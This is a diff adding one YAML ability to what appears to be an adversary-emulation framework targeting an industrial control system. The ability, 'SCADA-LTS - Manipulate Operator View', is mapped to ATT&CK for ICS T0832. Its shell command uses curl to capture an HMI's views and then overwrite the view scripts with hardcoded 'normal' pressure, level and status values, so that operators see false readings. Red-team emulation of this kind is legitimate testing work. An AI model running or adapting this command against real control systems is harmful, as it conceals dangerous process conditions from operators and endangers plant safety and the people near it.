@@ -1,0 +1,25 @@
+---
+
+- id: a7b8c9d0-7777-7777-7777-000000000004
+  name: SCADA-LTS - Manipulate Operator View
+  description: |
+    Modify the TenEastView1 graphical view in SCADA-LTS to display
+    static "normal" values by changing JavaScript formatters in the
+    ScriptComponents to return hardcoded safe values instead of live data.
+  tactic: impact
+  technique_id: T0832
+  technique_name: Manipulation of View
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      HMI="http://192.168.90.107:8080/ScadaBR" &&
+      curl -s -b /tmp/hmi.jar "$HMI/api/views" -o /tmp/views.json &&
+      echo "Current views captured." &&
+      curl -s -b /tmp/hmi.jar -X PUT "$HMI/api/views/1"
+      -H "Content-Type: application/json"
+      -d '{"components":[{"script":"return \"2450.0 kPa\""},
+           {"script":"return \"65.0%\""},
+           {"script":"return \"NORMAL\""}]}'
+      2>/dev/null &&
+      echo "VIEW_MANIPULATED: Operators now see false-normal values"
